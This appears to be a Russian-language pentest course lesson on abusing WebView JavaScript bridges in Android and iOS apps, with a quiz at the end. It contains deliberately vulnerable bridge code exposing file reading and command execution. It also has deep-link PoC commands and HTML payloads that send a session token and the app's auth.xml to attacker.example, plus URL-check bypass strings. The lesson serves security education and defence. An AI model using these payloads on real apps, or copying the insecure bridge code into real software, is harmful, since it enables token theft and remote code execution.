---
id: mobile-webview-jsbridge
title: "WebView JS-bridge abuse: вызов нативных методов из JS"
category: mobile
parent: mobile-webview-deep
difficulty: hard
order: 1
tags: [webview, javascriptinterface, jsbridge, android, rce, webviewclient, xss, bridge]
prerequisites: [mobile-webview-deep]
useful_for:
  - "Пентест мобильных приложений"
  - "Bug bounty (критичные цепочки)"
  - "CTF Mobile"
estimated_minutes: 50
summary: "Злоупотребление JavaScript-мостами WebView: как @JavascriptInterface превращает XSS в нативные вызовы, поиск опасных методов, эксплуатация и защита."
---
## Введение

WebView встраивает веб-контент в приложение и часто соединяет JS с нативным кодом через **JavaScript bridge** (`addJavascriptInterface` в Android, `WKScriptMessageHandler` в iOS). Если WebView загружает недоверенный контент (внешний URL, deep link-параметр), а мост экспонирует опасные методы (файлы, команды, токены), то XSS на странице превращается в нативный вызов — вплоть до RCE. Это одна из самых критичных мобильных цепочек. Продолжает `mobile-webview-deep`.

Ментальная модель: мост — это «дверь» из ненадёжного веб-мира в доверенный нативный. Задача — найти открытую дверь и то, что за ней.

## Как устроен мост (Android)

```java
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new Bridge(), "native");

class Bridge {
  @JavascriptInterface
  public String readFile(String path) { return new String(Files.readAllBytes(Paths.get(path))); }
  @JavascriptInterface
  public void exec(String cmd) { Runtime.getRuntime().exec(cmd); }
}
```

Из JS: `native.readFile("/data/data/com.target.app/...")` или `native.exec("...")`. `@JavascriptInterface` обязателен (иначе метод недоступен с Android 4.2) — но его наличие у опасного метода и есть уязвимость.

## Поиск мостов

```bash
# статически
jadx -d out app.apk
grep -rn "addJavascriptInterface\|@JavascriptInterface\|JavascriptInterface" out/sources/ | head
# настройки WebView
grep -rn "setJavaScriptEnabled\|setAllowFileAccess\|setAllowUniversalAccessFromFileURLs" out/sources/ | head
# динамически: логировать экспонируемые мосты
```

Frida-хук:

```javascript
Java.perform(function() {
  var WV = Java.use("android.webkit.WebView");
  WV.addJavascriptInterface.implementation = function(obj, name) {
    console.log("[bridge] " + name + " -> " + obj.getClass().getName());
    return this.addJavascriptInterface(obj, name);
  };
});
```

## Полный сквозной пример: XSS → bridge → кража токена

Дано: WebView грузит URL из deep link, мост `native` с методом `getToken()`.

```bash
# 1. Запускаем приложение с внешним URL
adb shell am start -a android.intent.action.VIEW -d "myapp://webview?url=https://attacker.example/evil.html"
```

`evil.html`:

```html
<script>
  // вызываем нативный метод через мост
  var t = native.getToken();
  new Image().src = "https://attacker.example/leak?t=" + encodeURIComponent(t);
</script>
```

Если токен утёк — bridge abuse подтверждён. Для RCE (если есть `exec`):

```html
<script>native.exec("sh -c 'id > /sdcard/pwned'")</script>
```

## iOS: WKWebView-мосты

```objectivec
WKUserContentController *ucc = [[WKUserContentController alloc] init];
[ucc addScriptMessageHandler:self name:@"native"];
// JS: window.webkit.messageHandlers.native.postMessage({cmd:"..."})
```

Проверяйте `userContentController(_:didReceive:)` — какие команды обрабатываются. Если доверяют `message.body`, а WebView грузит внешний контент — та же цепочка.

## Векторы достижения недоверенного контента

- Deep link с параметром `url`/`target`.
- `shouldOverrideUrlLoading` возвращает `false` для внешних URL.
- Редирект с доверенного домена на attacker (open redirect).
- Загрузка HTML из внешнего файла/QR.
- `setAllowUniversalAccessFromFileURLs(true)` + `file://` XSS.

## Защита (что искать в отчёте)

- Не экспонировать опасные методы через `@JavascriptInterface`.
- Валидировать URL (whitelist доменов) перед `loadUrl`.
- `setAllowFileAccess(false)`, `setAllowUniversalAccessFromFileURLs(false)`.
- Не возвращать `false` из `shouldOverrideUrlLoading` для внешних URL.
- Использовать `WebViewAssetLoader` для локального контента.

## Частые ошибки

- **Не включить `setJavaScriptEnabled`**: тогда мост не работает, но и XSS не сработает — проверяйте оба.
- **Искать только `addJavascriptInterface`**: iOS-мосты (`WKScriptMessageHandler`) тоже.
- **Игнорировать настройки WebView**: `file://`-доступ усиливает XSS.
- **Не найти источник недоверенного контента**: без него мост недостижим.
- **Тест на пустом WebView**: нужен реальный вход (deep link/redirect).
- **Забыть про обфускацию**: имена мостов могут быть переименованы — хукайте `addJavascriptInterface`.

## Что дальше / решение

Свяжите с `mobile-deeplink-rce` (вход), `mobile-webview-deep` (WebView-уязвимости), `mobile-deeplink-deep`. Демонстрируйте: вход → внешний контент → вызов моста → результат. Рекомендация: минимизировать мосты, валидировать URL, отключать файловый доступ.

## Справочная таблица

| Платформа | Мост | Хук |
|-----------|------|-----|
| Android | addJavascriptInterface | Frida WebView |
| iOS | WKScriptMessageHandler | Frida WKWebView |
| Оба | postMessage | логирование |

| Настройка | Опасность |
|-----------|-----------|
| setAllowFileAccess(true) | доступ к файлам |
| setAllowUniversalAccessFromFileURLs(true) | XSS из file:// |
| shouldOverrideUrlLoading=false | внешний контент |

## Полный разбор: от deep link до выполнения нативного метода

Разберём сквозной сценарий целиком, с разведкой и PoC. Дано: приложение `com.target.app` с экспортированной activity `WebActivity`, deep link `target://web?u=`, и WebView с мостом.

**Шаг 1. Разведка манифеста.**

```bash
apktool d app.apk -o s
grep -n -A6 'WebActivity' s/AndroidManifest.xml
# <activity android:name=".WebActivity" android:exported="true">
#   <intent-filter>
#     <action android:name="android.intent.action.VIEW"/>
#     <category android:name="android.intent.category.BROWSABLE"/>
#     <data android:scheme="target" android:host="web"/>
#   </intent-filter>
```

**Шаг 2. Поиск моста в декомпилированном коде.**

```bash
jadx -d out app.apk
grep -rn "addJavascriptInterface\|setJavaScriptEnabled\|loadUrl\|shouldOverrideUrlLoading" out/sources/com/target/app/ | head
```

Находим:

```java
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JsApi(this), "app");
// ...
webView.loadUrl(getIntent().getData().getQueryParameter("u"));
```

**Шаг 3. Анализ моста.** Смотрим `JsApi`:

```java
class JsApi {
  @JavascriptInterface public String getToken(){ return prefs.getString("token", ""); }
  @JavascriptInterface public void openUrl(String url){ webView.loadUrl(url); }
  @JavascriptInterface public String readFile(String p) throws IOException {
    return new String(Files.readAllBytes(Paths.get(p)));
  }
}
```

Есть `readFile` → потенциальный RCE/утечка. `getToken` → кража токена.

**Шаг 4. PoC.**

```bash
adb shell am start -a android.intent.action.VIEW -d "target://web?u=https://attacker.example/x.html"
```

`x.html`:

```html
<script>
  var t = app.getToken();
  fetch("https://attacker.example/l?t="+encodeURIComponent(t));
  var f = app.readFile("/data/data/com.target.app/shared_prefs/auth.xml");
  fetch("https://attacker.example/l?f="+encodeURIComponent(f));
</script>
```

**Шаг 5. Подтверждение.** В mitmproxy видим запросы на attacker с токеном и содержимым prefs. Уязвимость подтверждена: XSS в WebView → нативный мост → утечка приватных данных.

## Проверка iOS-варианта (WKWebView)

```bash
grep -rn "WKUserContentController\|addScriptMessageHandler\|evaluateJavaScript" out/ | head
```

```swift
// уязвимо, если message.body доверяют и WebView грузит внешний URL
func userContentController(_ ucc: WKUserContentController, didReceive message: WKScriptMessage) {
  if message.name == "native", let body = message.body as? [String: Any] {
    let cmd = body["cmd"] as? String ?? ""
    run(cmd)   // <- RCE
  }
}
```

PoC на iOS: тот же внешний URL → `window.webkit.messageHandlers.native.postMessage({cmd:"..."})`.

## Валидация URL: типичные ошибки

Проверки, которые легко обходятся:

```java
// ПЛОХО: startsWith проверяет только начало
if (url.startsWith("https://target.com")) loadUrl(url);
// обход: https://target.com.attacker.example/  или https://target.com@attacker/
// ПЛОХО: contains
if (url.contains("target.com")) loadUrl(url);
// обход: https://attacker.com/?x=target.com
// ПЛОХО: не проверять редирект
// если target.com имеет open redirect -> уход на attacker
```

Правильно — парсить URL и сверять `getHost()` по whitelist.

## Методический чек-лист

1. Перечислить все WebView-точки входа (deep link, exported activity, intent extra).
2. Проверить настройки WebView (JS, file access, universal access).
3. Найти все мосты (`addJavascriptInterface`, `WKScriptMessageHandler`).
4. Классифицировать методы моста (файлы, сеть, токены, exec).
5. Построить PoC от входа до вызова моста.
6. Зафиксировать влияние и рекомендации.

## Рекомендации в отчёте

- Никогда не грузить недоверенные URL в WebView с включённым JS-мостом.
- Валидировать URL строго (whitelist хостов, запрет редиректов).
- Отключать `setAllowFileAccess`/`setAllowUniversalAccessFromFileURLs`.
- Не экспонировать опасные методы (файлы, exec); минимизировать мост.
- Использовать `WebViewAssetLoader` и доверенные домены.
- Для iOS — валидировать `message.body` и `message.name`, не выполнять произвольные команды.

## Обфускация мостов и динамический поиск

Имена мостов и методов часто обфусцированы (R8/ProGuard), поэтому статический поиск по строке может не сработать. В этом случае ищите по классу: любой класс, содержащий методы с `@JavascriptInterface`, — мост. Grep по аннотации надёжнее, чем по имени:

```bash
grep -rn "@JavascriptInterface" out/sources/ | head
# затем смотрим класс и его методы
```

Динамически мост находится хуком `WebView.addJavascriptInterface` — вы получаете и имя, и класс. Это надёжнее статики при обфускации.

## Динамический поиск и подтверждение

Запустите приложение под Frida со скриптом, логирующим все мосты и все `loadUrl`:

```javascript
Java.perform(function() {
  var WV = Java.use("android.webkit.WebView");
  WV.addJavascriptInterface.implementation = function(o,n){ console.log("[bridge] "+n+" -> "+o.getClass().getName()); return this.addJavascriptInterface(o,n); };
  WV.loadUrl.overload("java.lang.String").implementation = function(u){ console.log("[loadUrl] "+u); return this.loadUrl(u); };
  WV.loadUrl.overload("java.lang.String","java.util.Map").implementation = function(u,h){ console.log("[loadUrl+] "+u); return this.loadUrl(u,h); };
});
```

Так вы видите реальные вызовы: какой URL грузится и какие мосты экспонированы. Если `loadUrl` получает внешний URL, а мост даёт доступ к файлам/токенам — цепочка подтверждена.

## Защита от обфускации

Обфускация не защищает от хука `addJavascriptInterface`: вы перехватываете сам механизм, а не имя. Поэтому рекомендация — не полагаться на переименование, а минимизировать мосты и валидировать URL. Обфускация лишь замедляет статический анализ.

## Итог

JS-bridge abuse — один из самых критичных классов мобильных уязвимостей: XSS превращается в нативный вызов. Динамический поиск через хук механизма обходит обфускацию и даёт точную картину.

## Практикум: полный PoC JS-bridge

Разберём полный PoC от разведки до утечки.

Шаг 1. Находим мост динамически:

```javascript
Java.perform(function() {
  var WV = Java.use("android.webkit.WebView");
  WV.addJavascriptInterface.implementation = function(o,n){ console.log("[bridge] "+n+" -> "+o.getClass().getName()); return this.addJavascriptInterface(o,n); };
});
```

Шаг 2. Определяем методы моста. Декомпилируем класс моста (`jadx`) и смотрим методы с `@JavascriptInterface`. Классифицируем: чтение файлов, токены, exec, сеть.

Шаг 3. Находим вход для недоверенного контента. Deep link с параметром URL, открытый редирект, внешний файл. Проверяем, что WebView грузит внешний контент (`shouldOverrideUrlLoading` возвращает false).

Шаг 4. Собираем HTML:

```html
<script>
  var t = app.getToken();
  new Image().src = "https://attacker.example/l?t=" + encodeURIComponent(t);
  var f = app.readFile("/data/data/com.target.app/shared_prefs/auth.xml");
  fetch("https://attacker.example/l?f=" + encodeURIComponent(f));
</script>
```

Шаг 5. Запускаем вход с этим URL, наблюдаем утечку в mitmproxy. Подтверждаем.

## Без доступа к мосту

Если WebView не грузит внешний контент, ищите другие входы: загрузка HTML из файла, редирект с доверенного домена, обновляемый контент. Иногда достаточно XSS на доверенном домене.

## Что писать в отчёте

Полный путь: вход → внешний контент → вызов моста → результат. Рекомендация: валидировать URL, отключать файловый доступ, минимизировать мост.

## Квиз

```quiz
- question: "Что превращает XSS в WebView в нативный вызов?"
  options:
    - "JavaScript bridge (addJavascriptInterface/@JavascriptInterface)"
    - "Manifest"
    - "CA-сертификат"
    - "Wi-Fi"
  answer: 0
- question: "Какая аннотация обязательна для метода, экспонируемого в JS (Android)?"
  options:
    - "@JavascriptInterface"
    - "@Override"
    - "@Nullable"
    - "@Deprecated"
  answer: 0
- question: "Какая настройка WebView открывает доступ к локальным файлам?"
  options:
    - "setAllowFileAccess(true)"
    - "setJavaScriptEnabled(false)"
    - "setSupportZoom(false)"
    - "setBlockNetworkLoads(true)"
  answer: 0
- question: "Какой iOS-мост используется в WKWebView?"
  options:
    - "WKScriptMessageHandler"
    - "addJavascriptInterface"
    - "DataClient"
    - "CarPropertyManager"
  answer: 0
- question: "Что искать как источник недоверенного контента?"
  options:
    - "Deep link-параметр URL, open redirect, внешний файл"
    - "Пароль Wi-Fi"
    - "Версию Android"
    - "Размер APK"
  answer: 0
```

## Где пригодится

- **Пентест:** критичные цепочки RCE.
- **Bug bounty:** XSS→bridge как critical.
- **Анализ малвари:** понимание атак.
- **CTF:** Mobile-задачи на WebView.
